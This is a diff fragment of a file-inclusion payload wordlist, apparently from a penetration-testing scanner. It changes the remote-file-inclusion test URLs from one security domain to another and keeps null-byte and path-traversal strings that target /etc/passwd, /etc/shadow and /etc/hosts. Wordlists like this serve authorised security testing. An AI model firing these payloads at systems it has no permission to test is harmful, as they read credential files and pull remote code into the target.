@@ -10,10 +10,10 @@ C:\boot.ini
 C:\boot.ini%00
 https://crowdshield.com/.testing/rfi_vuln.php
 https://crowdshield.com/.testing/rfi_vuln.php%00
-//xerosecurity.com/.testing/rfi_vuln.php
-//xerosecurity.com/.testing/rfi_vuln.php%00
-http://xerosecurity.com/.testing/rfi_vuln.php
-http://xerosecurity.com/.testing/rfi_vuln.php%00
+//sn1persecurity.com/.testing/rfi_vuln.php
+//sn1persecurity.com/.testing/rfi_vuln.php%00
+http://sn1persecurity.com/.testing/rfi_vuln.php
+http://sn1persecurity.com/.testing/rfi_vuln.php%00
 /../../../../../../../../../../../../../../../../../../etc/passwd
 /../../../../../../../../../../../../../../../../../../etc/shadow
 /../../../../../../../../../../../../../../../../../../etc/hosts
